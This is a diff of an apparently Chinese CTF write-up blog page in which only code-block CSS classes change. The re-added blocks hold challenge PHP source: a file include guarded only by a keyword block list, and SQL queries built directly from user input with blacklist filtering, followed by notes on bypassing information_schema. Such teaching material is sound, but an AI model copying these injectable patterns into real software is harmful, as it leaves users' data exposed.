+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php的源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);<span class="comment">#伪协议点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>(); <span class="comment"># fetch_assoc();这个函数用于从结果集中获取一行数据</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>(); <span class="comment"># fetch_assoc();这个函数用于从结果集中获取一行数据</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#change.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line"><span class="comment"># 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是单引号（&#x27;）双引号（&quot;）反斜杠（\）NULL&lt;/p&gt;&lt;br/&gt;</span></span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>; <span class="comment"># 黑名单过滤username 和 phone</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#change.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line"><span class="comment"># 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是单引号（&#x27;）双引号（&quot;）反斜杠（\）NULL&lt;/p&gt;&lt;br/&gt;</span></span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>; <span class="comment"># 黑名单过滤username 和 phone</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#delete.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#delete.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>多个界面，多个输入点，姓名，电话，地址</p>
 <p>-&gt; 姓名 和 电话有相同的黑名单过滤</p>
@@ -743,10 +740,10 @@
 <h2 id="GYCTF2020-Ezsqli-Bypass-information库-偏移注入"><a href="#GYCTF2020-Ezsqli-Bypass-information库-偏移注入" class="headerlink" title="[GYCTF2020]Ezsqli [ Bypass information库  偏移注入 ]"></a>[GYCTF2020]Ezsqli [ Bypass information库  偏移注入 ]</h2><h4 id="Bypasss-information库"><a href="#Bypasss-information库" class="headerlink" title="Bypasss information库"></a>Bypasss information库</h4><p>通过测试，主要是过滤了for - 即无法用information_schema库</p>
 <p>用其他的库来代替，要多试几个 - 因为有些库里面的表可能不完全 - 我试了有三个，只有一个是有flag表的，另外几个都只有user2333这个表</p>
